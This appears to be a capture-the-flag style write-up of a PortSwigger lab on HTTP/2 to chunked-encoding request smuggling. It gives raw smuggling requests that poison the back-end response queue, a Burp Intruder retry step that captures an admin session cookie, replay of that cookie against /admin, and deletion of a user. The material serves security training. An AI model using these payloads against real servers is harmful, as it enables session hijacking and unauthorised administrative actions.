#  Response queue poisoning via H2.TE request smuggling

## 📌 Lab Details
- **Title**: Response queue poisoning via H2.TE request smuggling
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/b0bedd0f5d815c54107d42a83e72de7254aa354f2dd106e6f2d8e47679ed2f60?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2fresponse-queue-poisoning%2flab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

## 🔍 Summary
This lab demonstrated **response queue poisoning via H2.TE request smuggling**. By smuggling a **complete extra request** inside an HTTP/2 request, we desynchronized the front-end and back-end, leaving leftover responses in the queue. Repeated poisoning eventually captured the **admin’s session cookie** when they logged in.

## 🛠 Steps to Solve
1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows.
   ```sh
   POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Transfer-Encoding: chunked

   0

   SMUGGLED
   ```
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server.
   ```sh
   POST /x HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Transfer-Encoding: chunked

   0

   GET /x HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   ```
4. Send the request to poison the response queue. You will receive the 404 response to your own request.
5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. If the attack is not successful then you can try sending a **sniper** attack through **Burp Intruder** to obtain a `302 Found` response.
6. Copy the session cookie and use it to send the following request:
   ```sh
   GET /admin HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=STOLEN-SESSION-COOKIE
   ```
7. In the response, find the URL for deleting `carlos` (`/admin/delete?username=carlos`), then update the path in your request accordingly. Send the request to delete `carlos` and solve the lab.

## 📖 Key Takeaways
- **Response Queue Poisoning**: Instead of prefix-smuggling, we smuggled a complete request, causing persistent misalignment of responses.
- **404 Trick**: Using a non-existent endpoint (/x) ensured our own requests always returned 404, making admin responses easy to spot.
- **Timing Matters**: Since the admin logs in every ~15s, and the connection resets after 10 requests, we had to carefully repeat poisoning to catch the right response.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d024b66a-dfe2-40e8-a663-494940bb5b1a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4ffadf8a-0baa-42f4-965e-25e3fc6cf2bc" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cf054049-88f5-4bea-9bf5-eec92efa1de4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/300bf450-5646-4496-9c53-cafae03f0bb7" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f9f3051a-0ca7-4d36-a0a2-061a7875740b" />
